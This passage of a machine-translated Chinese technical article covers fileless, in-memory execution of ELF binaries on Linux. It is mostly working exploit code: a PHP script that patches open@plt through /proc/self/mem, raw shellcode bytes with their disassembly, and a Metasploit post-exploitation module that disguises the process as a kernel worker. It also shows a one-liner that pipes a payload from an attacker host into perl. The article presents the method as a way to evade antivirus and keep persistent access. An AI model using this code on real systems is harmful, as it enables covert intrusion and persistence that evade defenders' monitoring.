class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p> 查找<code>open()</code>函数的地址： </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p> 现在，您可以直接下载我们的可执行文件。 <br> 首先，创建一个匿名文件： </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p> 我们将负载写入一个匿名文件： </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p> 我们正在寻找文件描述符号： </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p> 接下来，我们将路径写入可执行文件到堆栈上： </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p> 然后将要运行的参数传递给可执行文件： </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p> 接下来，通过调用<code>fork()</code> ，我们执行有效负载： </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  Shellcode通常是指一系列字节，这些字节存储在内存中，然后通常在另一个程序的上下文中使用缓冲区溢出攻击和其他方法执行。 在我们的例子中，shellcode不会向我们返回远程服务器（实际上是Shell）的命令提示符，但允许我们执行所需的命令。 </p><br><p> 要获取所需的字节序列，您可以编写C代码，然后将其翻译为汇编语言，或者从头开始编写汇编语言。 </p><br><p> 让我们看看上面清单中的字节序列后面隐藏了什么。 </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p> 我们程序的启动从c <code>fork</code>开始。  57是64位系统的系统调用标识符的数值。 该表可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">这里</a>找到。 </p><br><p> 接下来，我们调用<code>setsid</code> （数字标识符112）将子进程转换为父进程： </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p> 然后再做一个<code>fork</code> ： </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p> 然后执行熟悉的<code>execve()</code> ： </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p> 然后以<code>exit()</code> （60）结束该过程： </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p> 因此，我们可以随时随地替换open（）函数代码。 我们的可执行文件被放置在内存中，并通过PHP解释器执行。 系统调用以shellcode表示。 </p><br><h3 id="metasploit-framework">  Metasploit框架 </h3><br><p> 作为上述技术的汇总，我们<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">为MSF</a>准备了一个<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">模块</a> 。 </p><br><p> 要将其添加到Metasploit，只需将模块文件复制到目录<code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> ，然后在框架控制台中运行<code>reload_all</code>命令。 <br> 要使用我们的模块，请输入<code>use post/linux/manage/download_exec_elf_in_memory</code> （或其他路径，具体取决于放置模块文件的目录） <br> 在使用它之前，必须设置必要的选项。 选项列表与<code>show options</code>命令一起<code>show options</code> 。 </p><br><p>  <code>ARGS</code>可执行文件的参数 </p><br><p>  <code>FILE</code>可执行文件的路径。 在我们的例子中，这是Netcat。 </p><br><p>  <code>NAME</code>是进程的名称。 你什么都可以叫他。 例如，为了隐身，这可能是kworker：1井，或出于演示漫画之类的目的，例如KittyCat </p><br><p>  <code>SESSION</code> -Meterpreter会话。 可以理解，该模块将用于后期操作。 </p><br><p> 接下来，我们分别在<code>SRVHOST</code>和<code>SRVPORT</code>指定将要加载我们的http服务器的主机及其端口。 </p><br><p>  <code>VECTOR</code>将在内存中执行程序的方法，该参数是可选的，如果为空，脚本本身将建立必要的解释器。 当前支持PHP，Python或Perl。 </p><br><p> 使用<code>exploit</code>或<code>run</code>命令<code>run</code> </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p> 它的工作方式如下-我们指示所需的会话，它可以是meterpreter或常规的反向shell。 接下来，我们在进程列表中指出我们的elf的本地路径，参数和所需的名称。 开始之后，将启动本地Web服务器来托管有效负载，并且该会话将搜索“摇椅”，当前支持curl和wget。 找到至少其中之一后，如果未在<code>VECTOR</code>参数中指定所需的解释器，则将搜索所有解释器。 好吧，如果成功的话，将执行一个命令来从我们的Web服务器下载有效负载并将其通过管道传输到所需的解释器，即 像<code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya"> 而不是结论。 </h3><br><p> 在Linux上无文件下载ELF文件是进行渗透测试的有用技术。 这是一种相当安静的方法，可以承受各种防病毒保护工具，完整性监视系统以及监视硬盘驱动器内容变化的监视系统。 这样，您可以轻松维护对目标系统的访问，同时保留最少的痕迹。 <br> 在本文中，我们使用了解释性编程语言，这些语言通常默认安装在Linux发行版，固件，路由器和移动设备上。 我还要感谢<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">这篇文章</a>的作者，他启发了我们进行这篇评论。 </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN430902/">https://habr.com/ru/post/zh-CN430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN430890/index.html">敏捷特别可怕的地方</a></li>
<li><a href="../zh-CN430892/index.html">跨平台和本机方法在移动应用程序开发中的结合</a></li>
<li><a href="../zh-CN430894/index.html">情况：品牌在播客广告上花费越来越多的钱-我们理解为什么</a></li>
<li><a href="../zh-CN430896/index.html">Linux Foundation已为GraphQL和Ceph建立了资金-为什么需要它们，以及对它们的期望</a></li>
<li><a href="../zh-CN430900/index.html">历史上的第一台激光：那是什么</a></li>
<li><a href="../zh-CN430906/index.html">妈妈晚上平静地入睡-我们为Raspbian'a收集OpenCV</a></li>
<li><a href="../zh-CN430908/index.html">功率转换器控制模块：开发和组装</a></li>
<li><a href="../zh-CN430910/index.html">富布赖特奖学金：如何以及为什么？</a></li>
<li><a href="../zh-CN430912/index.html">我们给骗子带来干净的水：面试不是雇佣关系。 自然地</a></li>
<li><a href="../zh-CN430914/index.html">黑市价格分析的个人数据和突破</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>